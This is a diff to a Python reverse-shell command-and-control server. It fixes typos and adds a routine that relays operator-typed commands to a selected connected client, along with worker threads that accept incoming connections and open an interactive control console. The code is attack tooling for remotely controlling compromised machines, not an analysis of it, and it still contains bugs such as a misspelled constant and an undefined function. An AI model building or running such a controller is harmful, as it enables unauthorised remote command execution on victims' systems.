@@ -1,6 +1,7 @@
 import socket
 import threading
 import sys
+import time
 from queue import Queue
 
 
@@ -31,11 +32,11 @@ def socket_bind():
         global host
         global port
         global s
-        print("Binding socket to the port: " + str(port))
+        #print("Binding socket to the port: " + str(port))
         s.bind((host, port))
         s.listen(5)
     except socket.error as msg:
-        print("Socket binding error: " + msg + "\n" + "Retrying...")
+        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
         time.sleep(5)
         socket_bind()
 
@@ -83,12 +84,12 @@ def list_connections():
             del all_connections[i]
             del all_addresses[i]
             continue
-        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_address[i][1]) + '\n'
+        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
         print('------ Clients ------' + '\n' + results)
 
 
 # Select a target client
-def get _target(cmd):
+def get_target(cmd):
     try:
         target = cmd.replace('select ', '')
         target = int(target)
@@ -99,3 +100,51 @@ def get _target(cmd):
     except:
         print("Not a valid selection")
         return None
+
+
+# Command to client remote
+def send_target_commands(conn):
+	while True:
+		try:
+			cmd = input()
+			if len(str.encode(cmd)) > 0:
+				conn.send(str.encode(cmd))
+				client_response = str(conn.recv(20480), "utf-8")
+				print(client_response, end="")
+			if cmd == 'quit':
+				break
+		except:
+			print("Connection was lost")
+			break
+
+
+# Create worker threads
+def create_workers():
+	for _ in range(NUMBER_OF_THREAIDNG):
+		t = threading.Thread(target=work)
+		t.daemon = True
+		t.start()
+
+
+# Do the next job in the queue (one handles connections, other sends command)
+def work():
+	while True:
+		x = queue.get()
+		if x == 1:
+			socket_create()
+			socket_bind()
+			accept_connections()
+		if x == 2:
+			start_turtle()
+		queue.task_done()
+
+
+# Each list item is a new job
+def create_job():
+	for x in JOB_NUMBER:
+		queue.put(x)
+	queue.join()
+
+
+create_workers()
+create_job()
